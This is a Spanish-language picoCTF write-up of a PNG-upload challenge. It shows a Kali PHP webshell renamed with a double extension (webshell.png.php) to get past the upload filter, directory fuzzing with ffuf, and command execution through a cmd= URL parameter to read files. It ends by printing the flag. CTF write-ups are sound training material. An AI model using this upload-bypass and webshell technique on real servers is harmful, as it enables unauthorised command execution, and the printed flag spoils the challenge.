## Objetivo
I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:61272/)!
## Solución
Analizamos la pagina y vemos que trabaja con php
```bash
┌──(kali㉿kali)-[~]
└─$ whatweb http://atlas.picoctf.net:61871/
http://atlas.picoctf.net:61871/ [200 OK] Apache[2.4.56], Country[UNITED STATES][US], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[18.217.83.136], PHP[8.0.30], Title[File Upload Page], X-Powered-By[PHP/8.0.30]


┌──(kali㉿kali)-[~]
└─$ mkdir picoCTF  
                                       
┌──(kali㉿kali)-[~]
└─$ cd picoCTF 
                                       
┌──(kali㉿kali)-[~/picoCTF]
└─$ cp /usr/share/webshells/php/simple-backdoor.php webshell.php

                                                                                 
┌──(kali㉿kali)-[~/picoCTF]
└─$ ls
webshell.php
                                                                                 
┌──(kali㉿kali)-[~/picoCTF]
└─$ nano webshell.php 
                                                                                 
┌──(kali㉿kali)-[~/picoCTF]
└─$ mv webshell.php webshell.png.php

──(kali㉿kali)-[~/picoCTF]
└─$ ffuf -u http://atlas.picoctf.net:61871/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -ic

                                
```
Vemos el directorio
http://atlas.picoctf.net:61272/uploads/webshell.png.php?cmd=find%20/%20-name%20*txt%202%3E/dev/null

Hacemos cat a /var/www/html/GAZWIMLEGU2DQ.txt
http://atlas.picoctf.net:61272/uploads/webshell.png.php?cmd=cat%20/var/www/html/GAZWIMLEGU2DQ.txt

Contraseña revelada 
.PNG
/* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_03d1d548} *
## Notas Adicionales

## Referencias
https://audea.com/una-webshell-se-utiliza/
https://book.hacktricks.xyz/pentesting-web/file-upload
